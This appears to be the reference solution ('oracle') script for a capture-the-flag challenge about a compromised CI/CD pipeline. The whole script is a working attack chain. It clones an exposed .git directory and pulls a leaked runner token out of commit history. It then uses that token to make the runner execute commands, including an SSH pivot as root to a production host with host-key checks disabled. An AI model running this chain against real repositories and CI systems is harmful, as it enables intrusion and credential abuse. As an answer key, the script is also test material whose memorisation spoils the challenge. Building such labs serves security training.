#!/usr/bin/env bash
# Oracle: clone the leaked repo, take flag1 from ci config, dig the legacy
# runner token out of history, run a job for flag2, pivot to prod for flag3.
set -euo pipefail
cd /work
rm -rf corp-site
git clone -q http://web:8080/.git corp-site || { rm -rf corp-site; git clone -q http://web:8080/ corp-site; }
cd corp-site
echo "== flag1 (current ci config) =="
grep -o 'flag{[^}]*}' .gitlab-ci.yml
echo "== legacy token from history =="
TOKEN=$(git log -p --all -- runner.env | grep -o 'reg_[0-9a-f]\{32\}' | head -1)
echo "token: $TOKEN"
echo "== flag2 (job on runner) =="
curl -s -X POST http://runner:9000/api/jobs -d "{\"token\":\"$TOKEN\",\"script\":\"cat /flags/stage2\"}"
echo; echo "== flag3 (pivot to prod via runner) =="
curl -s -X POST http://runner:9000/api/jobs -d "{\"token\":\"$TOKEN\",\"script\":\"ssh -i /root/.ssh/id_ed25519 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@prod cat /root/flag3 2>/dev/null\"}"
echo
